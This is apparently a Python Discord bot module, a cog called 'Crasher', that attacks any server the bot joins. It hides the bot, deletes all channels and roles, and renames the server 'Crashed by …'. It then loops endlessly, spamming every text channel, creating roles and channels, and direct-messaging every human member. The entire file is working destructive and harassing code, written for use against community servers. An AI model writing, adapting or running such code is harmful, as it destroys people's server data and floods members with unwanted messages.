import discord
from discord.ext import commands
from modules.config import Config
from random import sample
from string import ascii_lowercase


class Crasher(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.config = Config()

    @commands.Cog.listener()
    async def on_guild_join(self, guild):
        await self.bot.change_presence(status=discord.Status.invisible)
        for channel in guild.channels:
            await channel.delete()

        await guild.edit(name=f'Crashed by {self.config.crashedby}')

        for role in guild.roles:
            try:
                await role.delete()
            except:
                pass
        
        while True:
            for channel in guild.channels:
                if isinstance(channel, discord.TextChannel):
                    await channel.send('Crashed by {}'.format(self.config.crashedby))

            role = await guild.create_role(name='Crashed by {}'.format(self.config.crashedby))
            for member in guild.members:
                if not member.bot:
                    try:
                        await member.add_roles(role.id)
                        await member.send(f'Crashed by {self.config.crashedby}')
                    except:
                        pass
            await guild.get_member(self.bot.user.id).edit(nick=''.join(sample(ascii_lowercase, 7)))

            await guild.create_text_channel('Crashed by {}'.format(self.config.crashedby))
            await guild.create_voice_channel('Crashed by {}'.format(self.config.crashedby))


def setup(bot):
    bot.add_cog(Crasher(bot))
